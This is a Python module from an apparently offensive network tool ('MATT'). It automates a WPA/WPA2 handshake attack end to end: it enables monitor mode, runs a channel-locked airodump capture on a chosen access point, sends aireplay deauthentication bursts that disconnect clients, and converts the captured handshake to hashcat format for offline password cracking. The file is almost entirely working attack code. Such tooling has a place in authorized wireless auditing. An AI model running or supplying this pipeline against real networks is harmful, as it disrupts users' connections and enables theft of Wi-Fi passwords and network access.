"""matt.wifi -- WPA/WPA2 handshake capture with a deauth trigger.

Capturing a WPA handshake is a different job from the managed-mode ARP MITM the
rest of MATT does: it needs a MONITOR-mode adapter, the aircrack-ng suite, and
(to force a fast handshake) a deauth that kicks a client off so it reconnects.
This module builds and orchestrates that pipeline; the captured handshake is
converted to the hashcat 22000 format MATT already understands, so it flows
straight into analyze/crack.

Standard-library only. The external tools (airmon-ng, airodump-ng, aireplay-ng,
hcxpcapngtool) are invoked as subprocesses, never imported. The command builders
are pure and testable; nothing here runs until orchestrate() is called.
"""

from __future__ import annotations

import os
import shutil
import subprocess
import time

__all__ = [
    "TOOLS", "missing_tools", "monitor_start", "monitor_stop", "scan",
    "capture", "deauth", "convert_22000", "plan", "orchestrate",
]

# The external tools this pipeline needs, and what each is for.
TOOLS = {
    "airmon-ng": "put the adapter into monitor mode",
    "airodump-ng": "capture the 802.11 handshake",
    "aireplay-ng": "send the deauth that forces a reconnect",
    "hcxpcapngtool": "convert the .cap to hashcat 22000",
}


def missing_tools(which=shutil.which) -> list:
    """Which of the required tools are not on PATH (install: aircrack-ng + hcxtools)."""
    return [t for t in TOOLS if not which(t)]


def monitor_start(iface: str, sudo: str = "sudo") -> list:
    """Command to put ``iface`` into monitor mode (yields e.g. wlan1mon)."""
    return [sudo, "airmon-ng", "start", iface]


def monitor_stop(mon_iface: str, sudo: str = "sudo") -> list:
    """Command to drop monitor mode and restore managed networking."""
    return [sudo, "airmon-ng", "stop", mon_iface]


def scan(mon_iface: str, sudo: str = "sudo") -> list:
    """Command to list nearby APs (BSSID, channel, clients)."""
    return [sudo, "airodump-ng", mon_iface]


def capture(mon_iface: str, bssid: str, channel, prefix: str,
            sudo: str = "sudo") -> list:
    """Command to lock to one AP's channel and write the handshake to PREFIX*."""
    return [sudo, "airodump-ng", "-c", str(channel), "--bssid", bssid,
            "-w", prefix, mon_iface]


def deauth(mon_iface: str, bssid: str, client: str = None, count: int = 5,
           sudo: str = "sudo") -> list:
    """Command to send ``count`` deauth frames (to a client, or broadcast) so a
    station reconnects and its 4-way handshake can be captured. count=0 is a
    continuous deauth -- disruptive, so MATT defaults to a short burst."""
    cmd = [sudo, "aireplay-ng", "--deauth", str(count), "-a", bssid]
    if client:
        cmd += ["-c", client]
    cmd.append(mon_iface)
    return cmd


def convert_22000(cap_file: str, out_file: str) -> list:
    """Command to convert a captured .cap/.pcapng into hashcat 22000 candidates."""
    return ["hcxpcapngtool", "-o", out_file, cap_file]


def plan(iface: str, bssid: str, channel, client: str = None, count: int = 5,
         prefix: str = "matt-wpa", out: str = "matt-wpa.22000") -> list:
    """The ordered recipe (list of commands) for a handshake capture: monitor on,
    channel-locked capture, deauth trigger, convert to 22000, monitor off. Used
    by --wpa --dry-run and as the single source of truth for orchestrate()."""
    mon = iface if iface.endswith("mon") else iface + "mon"
    return [
        ("monitor on", monitor_start(iface)),
        ("capture", capture(mon, bssid, channel, prefix)),
        ("deauth", deauth(mon, bssid, client, count)),
        ("convert", convert_22000(prefix + "-01.cap", out)),
        ("monitor off", monitor_stop(mon)),
    ]


def orchestrate(iface: str, bssid: str, channel, client: str = None, count: int = 5,
                prefix: str = "matt-wpa", out: str = "matt-wpa.22000",
                capture_secs: float = 20.0, runner=None, popen=None,
                which=None) -> dict:
    """Run the handshake capture for real: start the channel-locked capture in
    the background, fire a short deauth, let it run, stop, and convert.

    ``runner`` (default subprocess.run) and ``popen`` (default subprocess.Popen)
    are injectable so tests drive the whole flow without a radio. Returns a dict
    with the 22000 output path and per-step status; never raises for a tool that
    is missing -- that is a line in the result.
    """
    runner = runner or (lambda cmd: subprocess.run(cmd, capture_output=True,
                                                    text=True, timeout=30, check=False))
    popen = popen or (lambda cmd: subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                                   stderr=subprocess.DEVNULL,
                                                   stdin=subprocess.DEVNULL,
                                                   start_new_session=True))
    result = {"steps": [], "out": out, "ok": False}
    gone = missing_tools(which or shutil.which)
    if gone:
        result["error"] = "missing tools: " + ", ".join(gone)
        return result

    mon = iface if iface.endswith("mon") else iface + "mon"
    runner(monitor_start(iface))
    result["steps"].append("monitor on")
    cap = popen(capture(mon, bssid, channel, prefix))
    result["steps"].append("capture started")
    try:
        time.sleep(1.0)
        runner(deauth(mon, bssid, client, count))
        result["steps"].append("deauth sent")
        time.sleep(max(1.0, capture_secs))
    finally:
        try:
            cap.terminate()
            cap.wait(timeout=5)
        except Exception:
            pass
        result["steps"].append("capture stopped")
    conv = runner(convert_22000(prefix + "-01.cap", out))
    result["steps"].append("converted")
    result["ok"] = os.path.exists(out)
    runner(monitor_stop(mon))
    result["steps"].append("monitor off")
    return result
